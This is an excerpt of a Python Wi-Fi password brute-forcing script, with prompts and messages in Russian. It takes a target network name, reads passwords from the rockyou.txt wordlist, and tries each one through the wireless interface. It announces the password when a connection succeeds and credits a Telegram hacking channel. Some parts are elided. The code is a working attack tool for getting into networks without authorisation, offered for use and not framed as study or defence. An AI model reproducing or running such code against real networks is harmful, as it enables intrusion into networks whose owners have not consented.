...
client_ssid = input("Введите название сети: ")
path_to_file = r"C:\Users\latis\Desktop\ \wifi hack\rockyou.txt"
...
def main(ssid, password, number):
    ...
    time.sleep(0.01) # if script not working change time to 1 !!!!!!
    iface.connect(tmp_profile) # trying to Connect
    time.sleep(0.36) # 1s

    if ifaces.status() == const.IFACE_CONNECTED: # checker
        time.sleep(1)
        print(BOLD, GREEN,'[*] Ура получилось!',RESET)
        print(BOLD, GREEN,'[*] Спасибо  каналу телеграмм REHACK!',RESET)
        print(BOLD, GREEN,'[*] Пароль ' + password, RESET)
        time.sleep(1)
        input("Конец, нажмите для закрытия")
        exit()
    else:
        print(BLUE, '[{}] Пароль {} не подошёл. '.format(number, password))
